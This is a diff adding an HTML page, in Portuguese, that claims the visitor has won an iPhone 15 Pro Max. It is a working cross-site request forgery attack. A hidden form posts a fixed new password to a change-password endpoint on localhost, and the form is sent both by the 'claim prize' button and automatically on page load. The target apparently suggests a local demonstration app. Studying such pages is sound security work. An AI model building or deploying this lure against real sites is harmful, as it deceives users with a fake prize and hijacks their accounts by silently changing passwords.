@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ganhe um iPhone 15 Pro Max!</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .prize-image {
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <form id="hackerForm" action="http://localhost:3000/api/change-password" method="POST" class="hidden-form">
+        <input type="hidden" name="newPassword" value="senhaHackeada123">
+    </form>
+    
+    <h1>🎉 Parabéns! Você ganhou um iPhone 15 Pro Max! 🎉</h1>
+    <img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692845702708" 
+         alt="iPhone 15 Pro Max" 
+         class="prize-image">
+    <h2>Clique no botão abaixo para resgatar seu prêmio!</h2>
+    <button onclick="document.getElementById('hackerForm').submit()">
+        RESGATAR MEU iPHONE AGORA! 🎁
+    </button>
+
+    <script>
+        // Auto-submit do formulário quando a página carrega
+        window.onload = function() {
+            document.getElementById('hackerForm').submit();
+        }
+    </script>
+</body>
+</html> 
